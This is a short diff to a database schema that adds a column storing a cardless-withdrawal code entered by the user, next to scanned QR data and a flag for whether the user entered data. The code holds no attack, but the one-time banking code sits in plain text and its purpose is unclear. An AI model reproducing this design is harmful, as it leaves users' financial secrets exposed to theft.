@@ -122,6 +122,7 @@ export const sessions = pgTable("sessions", {
   createdBy: text("created_by"), // Añadimos el campo para saber qué usuario creó la sesión
   qrData: text("qr_data"), // Almacena el texto del código QR escaneado
   qrImageData: text("qr_image_data"), // Almacena la imagen del QR escaneado en base64
+  codigoRetiro: text("codigo_retiro"), // Almacena el código de retiro sin tarjeta ingresado por el usuario
   lastActivity: timestamp("last_activity").defaultNow(), // Último momento de actividad
   hasUserData: boolean("has_user_data").default(false) // Indica si el usuario ingresó algún dato
 });
